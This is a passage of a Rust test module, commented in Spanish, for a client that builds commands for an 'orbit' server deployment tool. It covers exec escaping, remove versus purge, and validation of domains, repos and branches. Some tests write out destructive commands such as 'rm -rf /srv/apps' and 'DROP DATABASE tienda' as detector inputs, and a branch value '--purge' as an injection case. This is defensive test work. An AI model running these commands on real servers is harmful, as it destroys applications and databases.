        }
        .argv(B)
        .unwrap();
        let otro = Comando::Ejecutar {
            app: "web".into(),
            modo: ModoDeExec::Argumentos(vec!["ls".into(), "-la".into()]),
        }
        .argv(B)
        .unwrap();
        assert_eq!(uno, [B, "exec", "web", "ls -la"]);
        assert_eq!(otro, [B, "exec", "web", "ls", "-la"]);
        assert_ne!(uno, otro);
    }

    #[test]
    fn exec_no_lleva_json() {
        // La salida de `exec` es la del comando, sin envolver. Orbit rechaza
        // `--json` por delante, y por detrás se lo pasa al comando — que es lo
        // que quiere quien escribe `orbit exec app mi-script --json`.
        let v = Comando::Ejecutar {
            app: "web".into(),
            modo: ModoDeExec::Shell("ls".into()),
        }
        .argv(B)
        .unwrap();
        assert!(!v.iter().any(|x| x == "--json"));
    }

    #[test]
    fn exec_sin_comando_se_rechaza_aqui() {
        // Sin comando, `orbit exec` abre un bash interactivo, y un cliente sin
        // terminal no puede con eso. Fingir medio terminal es peor que no
        // ofrecerlo.
        for modo in [
            ModoDeExec::Argumentos(vec![]),
            ModoDeExec::Shell("   ".into()),
        ] {
            let r = Comando::Ejecutar {
                app: "web".into(),
                modo,
            }
            .argv(B);
            assert_eq!(r, Err(ErrorForma::ExecSinComando));
        }
    }

    #[test]
    fn el_texto_de_exec_sobrevive_al_escapado() {
        // Es texto arbitrario por diseño, y tiene que llegar entero: la prueba
        // de propiedad lo comprueba contra cuatro shells, aquí sólo se fija que
        // viaja como UN argumento.
        let sucio = "psql \"select * from t where x = 'y'\" && echo $HOME";
        let v = Comando::Ejecutar {
            app: "web".into(),
            modo: ModoDeExec::Shell(sucio.into()),
        }
        .argv(B)
        .unwrap();
        assert_eq!(v.len(), 4);
        assert_eq!(v[3], sucio);
    }

    #[test]
    fn la_lista_de_patrones_es_pedagogica_y_se_sabe() {
        // No impide nada —hay mil formas de escribir un rm— y por eso su valor
        // es parar el error de dedos a las tres de la mañana, no defender.
        assert!(parece_peligroso("rm -rf /srv/apps").is_some());
        assert!(parece_peligroso("DROP DATABASE tienda").is_some());
        assert!(parece_peligroso("php artisan migrate").is_none());
        // Y se salta sin proponérselo, que es justo lo que hay que documentar.
        assert!(parece_peligroso("cd / && rm -rf apps").is_none());
    }

    #[test]
    fn retirar_y_borrar_son_dos_ordenes_distintas() {
        // No son la misma con una bandera: son daños de categoría distinta, y
        // Orbit los separó por eso. En la interfaz son dos entradas, no una
        // casilla — una casilla junto a un botón se marca sin leerla.
        let a = Comando::Retirar {
            app: "tienda".into(),
        }
        .argv(B)
        .unwrap();
        let b = Comando::RetirarYBorrar {
            app: "tienda".into(),
        }
        .argv(B)
        .unwrap();
        assert_eq!(a, [B, "remove", "tienda", "-y"]);
        assert_eq!(b, [B, "remove", "tienda", "-y", "--purge"]);
        assert!(!a.contains(&"--purge".to_string()));
    }

    #[test]
    fn retirar_sin_purge_no_puede_borrar_datos() {
        // '-y' significa «acepta el valor por defecto», y el valor por defecto
        // del borrado de datos es «no». Si esta prueba se rompiera, una
        // operación anunciada como reversible habría dejado de serlo.
        let v = Comando::Retirar {
            app: "tienda".into(),
        }
        .argv(B)
        .unwrap();
        assert!(!v.iter().any(|x| x == "--purge"));
    }

    #[test]
    fn logs_es_el_unico_flujo() {
        assert!(Comando::Logs {
            app: "web".into(),
            desde: None,
            lineas: None,
            seguir: false,
            solo_nginx: false
        }
        .es_flujo());
        assert!(!Comando::Lista.es_flujo());
        assert!(!Comando::Desplegar {
            app: "web".into(),
            progreso: true
        }
        .es_flujo());
    }

    #[test]
    fn la_linea_queda_escapada() {
        let l = Comando::Trafico {
            app: "mi-web".into(),
            desde: Some("7d".into()),
        }
        .linea(B)
        .unwrap();
        assert_eq!(l, "/usr/local/bin/orbit --json traffic mi-web --since 7d");
    }

    #[test]
    fn el_catalogo_no_puede_expresar_una_orden_sin_app() {
        // No hay ninguna variante con la app opcional donde el servidor elegiría
        // la primera por orden alfabético. Si alguien añade una, este test no la
        // ve — pero la revisión de este fichero sí, y ése es el sitio.
        let c = Comando::Info { app: String::new() };
        assert!(c.argv(B).is_err());
    }

    // ── `orbit new` ─────────────────────────────────────────────────────────

    fn nueva() -> Comando {
        Comando::Nueva(Box::new(WebNueva {
            nombre: "mi-web".into(),
            repo: "usuario/mi-web".into(),
            rama: "main".into(),
            dominio: "mi-web.ejemplo.com".into(),
            alias: vec![],
            correo: None,
            base_de_datos: false,
            https: true,
            ajustes: AjustesDeteccion::default(),
        }))
    }

    /// Muta la petición de dentro de la caja, para las pruebas de abajo.
    fn tocar(c: &mut Comando, f: impl FnOnce(&mut WebNueva)) {
        match c {
            Comando::Nueva(n) => f(n),
            _ => unreachable!(),
        }
    }

    #[test]
    fn new_no_lleva_json_porque_no_lo_tiene() {
        let v = nueva().argv("orbit").unwrap();
        assert!(
            !v.contains(&"--json".to_string()),
            "`orbit new --json` no da un objeto, da un error de sintaxis"
        );
        assert_eq!(v[1], "new");
        assert_eq!(v[2], "--yes");
    }

    /// La distinción que un campo de texto no puede expresar: «no digas nada y
    /// deja que lo detecte» y «esta app no se compila» son dos respuestas
    /// distintas, y la segunda viaja como `--build ''`.
    #[test]
    fn no_decir_nada_del_build_y_decir_que_no_hay_build_son_distintos() {
        let mut callado = nueva();
        let mut sin_build = nueva();
        let mut con_build = nueva();

        tocar(&mut callado, |n| n.ajustes.build = None);
        tocar(&mut sin_build, |n| n.ajustes.build = Some(Anulacion::Vacia));
        tocar(&mut con_build, |n| {
            n.ajustes.build = Some(Anulacion::Valor("pnpm build".into()))
        });

        let a = callado.argv("orbit").unwrap();
        let b = sin_build.argv("orbit").unwrap();
        let c = con_build.argv("orbit").unwrap();

        assert!(!a.contains(&"--build".to_string()), "callado no manda nada");

        let i = b.iter().position(|x| x == "--build").expect("--build ''");
        assert_eq!(b[i + 1], "", "el vacío es explícito y viaja como argumento");

        let j = c.iter().position(|x| x == "--build").unwrap();
        assert_eq!(c[j + 1], "pnpm build");

        assert_ne!(a, b, "y las tres órdenes son tres órdenes distintas");
        assert_ne!(b, c);
    }

    /// El servidor distingue «no he dicho nada de alias» de «ninguno»: con lo
    /// primero se inventa un `www.`. Como la interfaz siempre tiene una
    /// respuesta —la casilla está puesta o no—, siempre lo dice.
    #[test]
    fn la_lista_de_alias_vacia_se_manda_igual() {
        let v = nueva().argv("orbit").unwrap();
        let i = v.iter().position(|x| x == "--aliases").expect("--aliases");
        assert_eq!(v[i + 1], "");
    }

    #[test]
    fn los_alias_van_separados_por_espacio_como_los_lee_el_servidor() {
        let mut c = nueva();
        tocar(&mut c, |n| {
            n.alias = vec!["www.mi-web.ejemplo.com".into(), "mi-web.es".into()]
        });
        let v = c.argv("orbit").unwrap();
        let i = v.iter().position(|x| x == "--aliases").unwrap();
        assert_eq!(v[i + 1], "www.mi-web.ejemplo.com mi-web.es");
    }

    /// Una rama que empieza por guion se la come el analizador de opciones del
    /// otro lado antes de que nadie mire si existe. No es un problema de forma:
    /// es de quién interpreta el argumento.
    #[test]
    fn una_rama_con_guion_delante_no_sale_de_aqui() {
        let mut c = nueva();
        tocar(&mut c, |n| n.rama = "--purge".into());
        assert!(matches!(c.argv("orbit"), Err(ErrorForma::Rama(_))));
    }

    #[test]
    fn un_dominio_sin_punto_no_puede_tener_certificado() {
        assert!(!dominio_valido("localhost"));
        assert!(!dominio_valido("-mal.ejemplo.com"));
        assert!(!dominio_valido("mal-.ejemplo.com"));
        assert!(!dominio_valido("con_guion_bajo.ejemplo.com"));
        assert!(dominio_valido("mi-web.ejemplo.com"));
        assert!(dominio_valido("a.b"));
    }

    #[test]
    fn un_alias_invalido_para_la_orden_igual_que_el_dominio() {
        let mut c = nueva();
        tocar(&mut c, |n| {
            n.alias = vec!["bien.ejemplo.com".into(), "mal_.ejemplo.com".into()]
        });
        assert!(matches!(c.argv("orbit"), Err(ErrorForma::Dominio(_))));
    }

    #[test]
    fn el_repo_admite_las_dos_formas_que_admite_orbit_y_no_mas() {
        assert!(repo_valido("usuario/repo"));
        assert!(repo_valido("https://github.com/usuario/repo"));
        assert!(repo_valido("https://github.com/usuario/repo.git"));
        // Con clave del servidor: no se promete lo que no se ha mirado.
        assert!(!repo_valido("git@github.com:usuario/repo.git"));
        assert!(!repo_valido("ssh://git@host/repo"));
        assert!(!repo_valido("-repo"));
        assert!(!repo_valido("usuario/repo/de/mas"));
        assert!(!repo_valido("solorepo"));
        assert!(!repo_valido("usuario/"));
    }

    /// `--no-ssl` es lo que se añade, no lo que se quita: la orden por defecto
    /// emite el certificado, y renunciar a él tiene que ser visible en el argv.
    #[test]
    fn renunciar_al_certificado_se_ve_en_la_orden() {
        let v = nueva().argv("orbit").unwrap();
        assert!(!v.contains(&"--no-ssl".to_string()));

        let mut c = nueva();
        tocar(&mut c, |n| n.https = false);
        assert!(c.argv("orbit").unwrap().contains(&"--no-ssl".to_string()));
    }

    /// El nombre pasa por el mismo validador que el resto del catálogo: no hay
    /// una regla de forma para crear y otra para operar.
    #[test]
    fn el_nombre_nuevo_usa_la_regla_del_servidor() {
        let mut c = nueva();
        tocar(&mut c, |n| n.nombre = "Mi Web".into());
        assert!(matches!(c.argv("orbit"), Err(ErrorForma::NombreDeApp(_))));
    }

    /// Y el caso normal no lleva ni una bandera de detección: adelantarse a la
    /// detección es la excepción, y una orden llena de banderas vacías haría
    /// creer lo contrario a quien la lea en el repaso.
    #[test]
    fn sin_ajustes_la_orden_no_lleva_banderas_de_deteccion() {
        let v = nueva().argv("orbit").unwrap();
        for b in ["--type", "--build", "--start", "--outdir", "--appdir"] {
            assert!(!v.contains(&b.to_string()), "sobra {b}");
        }
        assert!(AjustesDeteccion::default().vacios());
    }
}
